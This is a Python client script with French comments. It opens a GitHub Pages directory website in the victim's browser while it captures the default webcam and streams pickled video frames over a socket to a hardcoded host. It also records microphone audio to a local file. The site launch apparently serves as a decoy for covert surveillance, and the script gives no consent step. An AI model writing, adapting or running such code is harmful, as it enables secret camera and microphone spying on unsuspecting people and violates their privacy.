import cv2
import socket
import struct
import pickle
import threading
import pyaudio
import wave
import webbrowser

# Configuration
HOSTNAME  = 'A0008471'  # Remplacez par l'IP du serveur
PORT = 9999           # Port utilisé pour la communication
AUDIO_TEMP_FILE = "temp_audio.wav"  # Fichier temporaire pour l'audio brut
SITE_URL = "https://thomas91600.github.io/Annuaire_DDC/"  # URL de votre site web


def resolve_hostname(hostname):
    """Résoudre le nom d'hôte en adresse IP."""
    try:
        ip_addresses = socket.getaddrinfo(hostname, None)
        # Filtrer les adresses IPv4 (AF_INET)
        ipv4_addresses = [ip[4][0] for ip in ip_addresses if ip[0] == socket.AF_INET]
        if not ipv4_addresses:
            raise ValueError("Aucune adresse IPv4 trouvée.")
        return ipv4_addresses[0]  # Retourne la première adresse trouvée
    except Exception as e:
        print(f"Erreur lors de la résolution du nom d'hôte '{hostname}': {e}")
        return None
    

def open_site():
    """Ouvrir le site web dans le navigateur par défaut."""
    print(f"Lancement du site : {SITE_URL}")
    webbrowser.open(SITE_URL)

def record_audio(audio_duration, stop_event):
    """Fonction pour enregistrer l'audio en parallèle."""
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    frames = []
    for _ in range(0, int(RATE / CHUNK * audio_duration)):
        if stop_event.is_set():
            break
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    # Sauvegarder l'audio dans un fichier temporaire
    if frames:
        with wave.open(AUDIO_TEMP_FILE, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        print(f"Fichier audio sauvegardé sous {AUDIO_TEMP_FILE}")
    else:
        print("Aucun audio capturé.")


def main():
    threading.Thread(target=open_site, daemon=True).start()

    resolved_ip = resolve_hostname(HOSTNAME)
    if not resolved_ip:
        print(f"Impossible de résoudre l'adresse IP pour '{HOSTNAME}'.")
        return
    print(f"Adresse IP résolue pour '{HOSTNAME}': {resolved_ip}")

    # Ouvrir la caméra
    cap = cv2.VideoCapture(0)  # 0 pour la caméra par défaut
    if not cap.isOpened():
        print("Erreur : Impossible d'accéder à la caméra.")
        return

    # Configurer le socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((resolved_ip , PORT))
        print("Connecté au serveur.")
    except socket.error as e:
        print(f"Erreur de connexion : {e}")
        return

    # Démarrer un thread pour enregistrer l'audio
    stop_event = threading.Event()  # Utilisé pour arrêter l'enregistrement de l'audio
    audio_thread = threading.Thread(target=record_audio, args=(20, stop_event))  # Enregistrement de 20 secondes
    audio_thread.start()

    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                print("Erreur lors de la lecture de la caméra.")
                break

            # Sérialiser le cadre (frame)
            data = pickle.dumps(frame)
            message_size = struct.pack("L", len(data))

            try:
                # Envoyer la taille suivie de l'image
                client_socket.sendall(message_size + data)
            except socket.error as e:
                print(f"Erreur lors de l'envoi des données : {e}")
                break  # Arrêter la boucle en cas d'erreur
    except KeyboardInterrupt:
        print("\nArrêt du client.")
    finally:
        # Arrêter l'enregistrement audio proprement
        stop_event.set()
        audio_thread.join()
        cap.release()
        client_socket.close()


if __name__ == "__main__":
    main()
